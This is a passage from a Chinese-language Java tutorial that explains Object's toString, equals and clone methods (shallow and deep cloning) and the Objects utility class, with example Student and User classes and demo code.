<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>    <span class="comment">// 返回该对象的字符串表示形式(可以看做是对象的内存地址值)</span></span><br><span class="line"><span class="comment">// 比较两个对象地址值是否相等；true表示相同，false表示不相同</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span>  </span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">clone</span><span class="params">()</span>   <span class="comment">// 对象克隆</span></span><br></pre></td></tr></table></figure>
<h4 id="案例演示-v4"><a class="header-anchor" href="#案例演示-v4">¶</a>案例演示</h4>
<h5 id="案例1：toString方法"><a class="header-anchor" href="#案例1：toString方法">¶</a>案例1：toString方法</h5>
<ul>
<li>实现步骤：</li>
</ul>
<ol>
<li>创建一个学生类，提供两个成员变量（name ， age）；并且提供对应的无参构造方法和有参构造方法以及get/set方法</li>
<li>创建一个测试类（ObjectDemo01），在测试类的main方法中去创建学生对象，然后调用该对象的toString方法获取该对象的字符串表现形式，并将结果进行输出</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name ;       <span class="comment">// 姓名</span></span><br><span class="line">    <span class="keyword">private</span> String age ;        <span class="comment">// 年龄</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 无参构造方法和有参构造方法以及get和set方法略</span></span><br><span class="line">    ...  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ObjectDemo01</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建学生对象</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;itheima&quot;</span> , <span class="string">&quot;14&quot;</span>) ;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用toString方法获取s1对象的字符串表现形式</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">result1</span> <span class="operator">=</span> s1.toString();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出结果</span></span><br><span class="line">        System.out.println(<span class="string">&quot;s1对象的字符串表现形式为：&quot;</span> + result1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 得到结果：</span></span><br><span class="line"><span class="comment">// s1对象的字符串表现形式为：com.itheima.api.system.demo04.Student@3f3afe78</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Object类中toString方法的源码↓↓</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;                <span class="comment">// Object类中toString方法的源码定义</span></span><br><span class="line">   <span class="keyword">return</span> getClass().getName() + <span class="string">&quot;@&quot;</span> + Integer.toHexString(hashCode());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 其中getClass().getName()对应的结果就是：com.itheima.api.system.demo04.Student；</span></span><br><span class="line"><span class="comment">// Integer.toHexString(hashCode())对应的结果就是3f3afe78</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>将&quot;com.itheima.api.system.demo04.Student@3f3afe78&quot;这一部分称之为<strong>对象的内存地址值</strong></p>
</li>
<li>
<p>一般情况下获取对象的内存地址值没有太大的意义。获取对象的成员变量的<strong>字符串拼接形式</strong>才算有意义</p>
</li>
<li>
<p>需要在Student类中<strong>重写Object的toString</strong>方法</p>
</li>
</ul>
<h5 id="在idea中实现Object类的toString方法重写"><a class="header-anchor" href="#在idea中实现Object类的toString方法重写">¶</a>在idea中实现Object类的toString方法重写</h5>
<ol>
<li>在空白处使用快捷键：alt + insert。此时会弹出如下的对话框</li>
<li>选择toString，此时会弹出对话框</li>
<li>同时选择name和age属性，点击OK。此时就会完成toString方法的重写</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Student&#123;&quot;</span> +</span><br><span class="line">        <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">        <span class="string">&quot;, age=&#x27;&quot;</span> + age + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">        <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 这段代码就是把Student类中的成员变量进行了字符串的拼接</span></span><br></pre></td></tr></table></figure>
<ul>
<li>重写toString方法的意义就是以良好的格式，更方便的展示对象中的属性值</li>
</ul>
<h6 id="小结-v2"><a class="header-anchor" href="#小结-v2">¶</a>小结</h6>
<ol>
<li>在通过输出语句输出一个对象时，默认调用的就是toString()方法</li>
<li>输出地址值一般没有意义，我们可以通过重写toString方法去输出对应的成员变量信息（快捷键：atl + insert ， 空白处 右键 -&gt; Generate -&gt; 选择toString）</li>
<li>toString方法的作用：以良好的格式，更方便的展示对象中的属性值</li>
<li>一般情况下Jdk所提供的类都会重写Object类中的toString方法</li>
</ol>
<h5 id="案例2：演示equals方法"><a class="header-anchor" href="#案例2：演示equals方法">¶</a>案例2：演示equals方法</h5>
<ul>
<li>在测试类（ObjectDemo02）的main方法中，创建两个学生对象，然后比较两个对象是否相同</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ObjectDemo02</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建两个学生对象</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;itheima&quot;</span> , <span class="string">&quot;14&quot;</span>) ;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;itheima&quot;</span> , <span class="string">&quot;14&quot;</span>) ;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 比较两个对象是否相等</span></span><br><span class="line">        System.out.println(s1 == s2);  <span class="comment">// false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 因为&quot;==&quot;号比较的是对象的地址值，而我们通过new关键字创建了两个对象，它们的地址值是不相同的。因此比较结果就是false</span></span><br></pre></td></tr></table></figure>
<ul>
<li>尝试调用Object类中的equals方法进行比较</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 调用equals方法比较两个对象是否相等</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">result</span> <span class="operator">=</span> s1.equals(s2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结果</span></span><br><span class="line">System.out.println(result);</span><br><span class="line"><span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Object类中equals方法的源码</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;     <span class="comment">// Object类中的equals方法的源码</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">this</span> == obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>默认情况下equals方法比较的也是对象的地址值。比较内存地址值一般情况下是没有意义的，我们希望比较的是对象的属性，如果两个对象的属性相同，我们认为就是同一个对象</li>
<li>那么要比较对象的属性，我们就需要在Student类中<strong>重写Object类中的equals方法</strong></li>
</ul>
<h5 id="在idea中实现Object类的equals方法重写"><a class="header-anchor" href="#在idea中实现Object类的equals方法重写">¶</a>在idea中实现Object类的equals方法重写</h5>
<ol>
<li>在空白处使用快捷键：alt + insert。此时会弹出对话框</li>
<li>选择equals() and hashCode()方法，此时会弹出对话框</li>
<li>点击next，会弹出对话框</li>
<li>选择name和age属性点击next，此时就会弹出对话框；取消name和age属性（因为此时选择的是在生成hashCode方法时所涉及到的属性，关于hashCode方法后期再做重点介绍）</li>
<li>点击Finish完成生成操作</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 生成的equals方法和hashCode方法</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span> == o) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="literal">null</span> || getClass() != o.getClass()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> (Student) o;</span><br><span class="line">    <span class="keyword">return</span> Objects.equals(name, student.name) &amp;&amp; Objects.equals(age, student.age);        <span class="comment">// 比较的是对象的name属性值和age属性值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 返回：true</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="小结-v3"><a class="header-anchor" href="#小结-v3">¶</a>小结</h6>
<ol>
<li>默认情况下equals方法比较的是对象的地址值</li>
<li>比较对象的地址值是没有意义的，因此一般情况下我们都会重写Object类中的equals方法</li>
</ol>
<h5 id="案例3：对象克隆"><a class="header-anchor" href="#案例3：对象克隆">¶</a>案例3：对象克隆</h5>
<ul>
<li>把A对象的属性值完全拷贝给B对象，也叫对象拷贝,对象复制</li>
</ul>
<h6 id="对象克隆的分类"><a class="header-anchor" href="#对象克隆的分类">¶</a>对象克隆的分类</h6>
<blockquote>
<p>浅克隆和深克隆</p>
</blockquote>
<ul>
<li>
<p>浅克隆</p>
<ul>
<li>不管对象内部的属性是基本数据类型还是引用数据类型，都完全拷贝过来</li>
<li>基本数据类型拷贝过来的是具体的数据，引用数据类型拷贝过来的是地址值。</li>
<li>Object类默认的是浅克隆</li>
</ul>
</li>
<li>
<p>深克隆</p>
<ul>
<li>基本数据类型拷贝过来，字符串复用，引用数据类型会重新创建新的</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.a04objectdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ObjectDemo4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CloneNotSupportedException &#123;</span><br><span class="line">        <span class="comment">// protected object clone(int a) 对象克隆 </span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.先创建一个对象</span></span><br><span class="line">        <span class="type">int</span>[] data = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">0</span>&#125;;</span><br><span class="line">        <span class="type">User</span> <span class="variable">u1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">1</span>, <span class="string">&quot;zhangsan&quot;</span>, <span class="string">&quot;1234qwer&quot;</span>, <span class="string">&quot;girl11&quot;</span>, data);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.克隆对象</span></span><br><span class="line">        <span class="comment">//细节:</span></span><br><span class="line">        <span class="comment">//方法在底层会帮我们创建一个对象,并把原对象中的数据拷贝过去。</span></span><br><span class="line">        <span class="comment">//书写细节:</span></span><br><span class="line">        <span class="comment">//1.重写Object中的clone方法</span></span><br><span class="line">        <span class="comment">//2.让javabean类实现Cloneable接口</span></span><br><span class="line">        <span class="comment">//3.创建原对象并调用clone就可以了</span></span><br><span class="line">        <span class="comment">//User u2 =(User)u1.clone();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//验证一件事情：Object中的克隆是浅克隆</span></span><br><span class="line">        <span class="comment">//想要进行深克隆，就需要重写clone方法并修改里面的方法体</span></span><br><span class="line">        <span class="comment">//int[] arr = u1.getData();</span></span><br><span class="line">        <span class="comment">//arr[0] = 100;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//System.out.println(u1);</span></span><br><span class="line">        <span class="comment">//System.out.println(u2);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//以后一般会用第三方工具进行克隆</span></span><br><span class="line">        <span class="comment">//1.第三方写的代码导入到项目中</span></span><br><span class="line">        <span class="comment">//2.编写代码</span></span><br><span class="line">        <span class="comment">//Gson gson =new Gson();</span></span><br><span class="line">        <span class="comment">//把对象变成一个字符串</span></span><br><span class="line">        <span class="comment">//String s=gson.toJson(u1);</span></span><br><span class="line">        <span class="comment">//再把字符串变回对象就可以了</span></span><br><span class="line">        <span class="comment">//User user =gson.fromJson(s, User.class);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//int[] arr=u1.getData();</span></span><br><span class="line">        <span class="comment">//arr[0] = 100;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//打印对象</span></span><br><span class="line">        <span class="comment">//System.out.println(user);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.itheima.a04objectdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.StringJoiner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Cloneable</span></span><br><span class="line"><span class="comment">//如果一个接口里面没有抽象方法</span></span><br><span class="line"><span class="comment">//表示当前的接口是一个标记性接口</span></span><br><span class="line"><span class="comment">//现在Cloneable表示一旦实现了，那么当前类的对象就可以被克降</span></span><br><span class="line"><span class="comment">//如果没有实现，当前类的对象就不能克隆</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Cloneable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> String path;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span>[] data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(<span class="type">int</span> id, String username, String password, String path, <span class="type">int</span>[] data)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">        <span class="built_in">this</span>.password = password;</span><br><span class="line">        <span class="built_in">this</span>.path = path;</span><br><span class="line">        <span class="built_in">this</span>.data = data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> id</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 设置</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> id</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> username</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 设置</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> username</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> password</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 设置</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> password</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPassword</span><span class="params">(String password)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> path</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPath</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> path;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 设置</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> path</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPath</span><span class="params">(String path)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.path = path;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> data</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] getData() &#123;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 设置</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> data</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setData</span><span class="params">(<span class="type">int</span>[] data)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.data = data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;角色编号为：&quot;</span> + id + <span class="string">&quot;，用户名为：&quot;</span> + username + <span class="string">&quot;密码为：&quot;</span> + password + <span class="string">&quot;, 游戏图片为:&quot;</span> + path + <span class="string">&quot;, 进度:&quot;</span> + arrToString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">arrToString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">StringJoiner</span> <span class="variable">sj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringJoiner</span>(<span class="string">&quot;, &quot;</span>, <span class="string">&quot;[&quot;</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; data.length; i++) &#123;</span><br><span class="line">            sj.add(data[i] + <span class="string">&quot;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sj.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Object <span class="title function_">clone</span><span class="params">()</span> <span class="keyword">throws</span> CloneNotSupportedException &#123;</span><br><span class="line">        <span class="comment">//调用父类中的clone方法</span></span><br><span class="line">        <span class="comment">//相当于让Java帮我们克隆一个对象，并把克隆之后的对象返回出去。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//先把被克隆对象中的数组获取出来</span></span><br><span class="line">        <span class="type">int</span>[] data = <span class="built_in">this</span>.data;</span><br><span class="line">        <span class="comment">//创建新的数组</span></span><br><span class="line">        <span class="type">int</span>[] newData =<span class="keyword">new</span> <span class="title class_">int</span>[data.length];</span><br><span class="line">        <span class="comment">//拷贝数组中的数据</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; data.length; i++) &#123;</span><br><span class="line">            newData[i] = data[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//调用父类中的方法克隆对象</span></span><br><span class="line">            User u=(User)<span class="built_in">super</span>.clone();</span><br><span class="line">        <span class="comment">//因为父类中的克隆方法是浅克隆，替换克隆出来对象中的数组地址值</span></span><br><span class="line">        u.data =newData;</span><br><span class="line">        <span class="keyword">return</span> u;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Objects类"><a class="header-anchor" href="#Objects类">¶</a>Objects类</h3>
<ul>
<li>Objects类所在包是在java.util包下，因此在使用的时候需要进行导包</li>
<li>并且Objects类是被final修饰的，因此该类<strong>不能被继承</strong>。</li>
<li>Objects类提供了一些对象常见操作的方法。比如判断<strong>对象是否相等</strong>，判断<strong>对象是否为null</strong>等等</li>
<li>Objects类中无无参构造方法，因此我们不能使用new关键字去创建Objects的对象</li>
<li>可以发现Objects类中所提供的方法都是<strong>静态</strong>的。因此我们可以<strong>通过类名直接去调用</strong>这些方法</li>
</ul>
<h4 id="常见方法-v5"><a class="header-anchor" href="#常见方法-v5">¶</a>常见方法</h4>
<ul>
<li>重点学习的Objects类中的常见方法</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toString</span><span class="params">(Object o)</span>       <span class="comment">// 获取对象的字符串表现形式</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object a, Object b)</span>     <span class="comment">// 比较两个对象是否相等</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isNull</span><span class="params">(Object obj)</span>             <span class="comment">// 判断对象是否为null</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">nonNull</span><span class="params">(Object obj)</span>            <span class="comment">// 判断对象是否不为null</span></span><br></pre></td></tr></table></figure>
<ul>
<li>了解的Objects类中的常见方法</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">requireNonNull</span><span class="params">(T obj)</span>  <span class="comment">// 检查对象是否不为null,如果为null直接抛出异常；如果不是null返回该对象；</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">requireNonNullElse</span><span class="params">(T obj, T defaultObj)</span> <span class="comment">// 检查对象是否不为null，如果不为null，返回该对象；如果为null返回defaultObj值</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">requireNonNullElseGet</span><span class="params">(T obj, Supplier&lt;? extends T&gt; supplier)</span>        <span class="comment">// 检查对象是否不为null，如果不为null，返回该对象；如果                           // 为null,返回由Supplier所提供的值</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// T可以理解为是Object类型</span></span><br></pre></td></tr></table></figure>
<h4 id="案例演示-v5"><a class="header-anchor" href="#案例演示-v5">¶</a>案例演示</h4>
<h5 id="案例1：演示重点学习方法"><a class="header-anchor" href="#案例1：演示重点学习方法">¶</a>案例1：演示重点学习方法</h5>
<ul>
<li>实现步骤：
<ol>
<li>创建一个学生类，提供两个成员变量（name ， age）；并且提供对应的无参构造方法和有参构造方法以及get/set方法，并且重写toString方法和equals方法</li>
<li>创建一个测试类（ObjectsDemo01）, 在该类中编写测试代码</li>
</ol>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name ;       <span class="comment">// 姓名</span></span><br><span class="line">    <span class="keyword">private</span> String age ;        <span class="comment">// 年龄</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 其他代码略</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ObjectsDemo01</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用方法</span></span><br><span class="line">        method_04() ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 测试nonNull方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">method_04</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个学生对象</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;itheima&quot;</span> , <span class="string">&quot;14&quot;</span>) ;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用Objects类中的nonNull方法</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">result</span> <span class="operator">=</span> Objects.nonNull(s1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出结果</span></span><br><span class="line">        System.out.println(result);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 测试isNull方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">method_03</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个学生对象</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;itheima&quot;</span> , <span class="string">&quot;14&quot;</span>) ;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用Objects类中的isNull方法</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">result</span> <span class="operator">=</span> Objects.isNull(s1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出结果</span></span><br><span class="line">        System.out.println(result);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 测试equals方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">method_02</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建两个学生对象</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;itheima&quot;</span> , <span class="string">&quot;14&quot;</span>) ;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 